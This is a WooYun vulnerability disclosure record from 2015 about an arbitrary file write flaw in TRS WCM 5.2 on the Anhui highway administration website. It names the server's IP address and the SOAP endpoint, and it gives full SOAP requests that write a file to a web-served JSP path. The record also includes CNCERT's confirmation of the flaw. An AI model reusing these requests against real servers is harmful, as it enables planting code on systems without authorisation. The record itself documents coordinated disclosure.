{"id": 40224, "wybug_id": "wooyun-2015-092138", "wybug_title": "安徽省公路管理网站任意文件写入漏洞", "wybug_corp": "安徽省公路管理局", "wybug_author": "冰火九天", "wybug_date": "2015-01-16 16:29", "wybug_open_date": "2015-03-02 16:30", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-02：\t细节向公众公开  简要描述： 2015年新年新气象，发个洞刷存在感，表明此号未死 详细说明：  http://60.173.215.11/wcm/ 是trs wcm 5.2根据 WooYun: TRS WCM 6.X系统任意文件写入漏洞 照葫芦画瓢http://60.173.215.11/wcm/services/trs:templateservicefacade?wsdl 漏洞存在\n\n   漏洞证明：  先打开soapUI，建个新项目，输入http://60.173.215.11/wcm/services/trs:templateservicefacade?wsdl\n\n先用writeFile随便提交\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">   <soapenv:Body>      <ns1:writeFileResponse soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:ns1=\"http://impl.service.template.trs.com\">         <writeFileReturn xsi:type=\"soapenc:string\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">/trs/TRSWCM52/WCMDATA/systemp/ST201501/ST20150115/ST20150115839501229134.?</writeFileReturn>      </ns1:writeFileResponse>   </soapenv:Body></soapenv:Envelope>\n得到绝对路径/trs/TRSWCM52/再用writeSpecFile提交任意文件penetration test. base64编码得到 cGVuZXRyYXRpb24gdGVzdC4=\n<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:impl=\"http://impl.service.template.trs.com\">   <soapenv:Header/>   <soapenv:Body>      <impl:writeSpecFile soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">         <_pFileContent xsi:type=\"soapenc:base64Binary\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">cGVuZXRyYXRpb24gdGVzdC4=</_pFileContent>         <_sFilePath xsi:type=\"soapenc:string\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">/trs/TRSWCM52/webapps/wcm/test.jsp</_sFilePath>      </impl:writeSpecFile>   </soapenv:Body></soapenv:Envelope>\n\n\n上传成功\n\n   修复方案：  不是说13年就出补丁了吗，怎么还没补   版权声明：转载请注明来源 冰火九天@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-21 09:42 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给安徽分中心，由安徽分中心后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}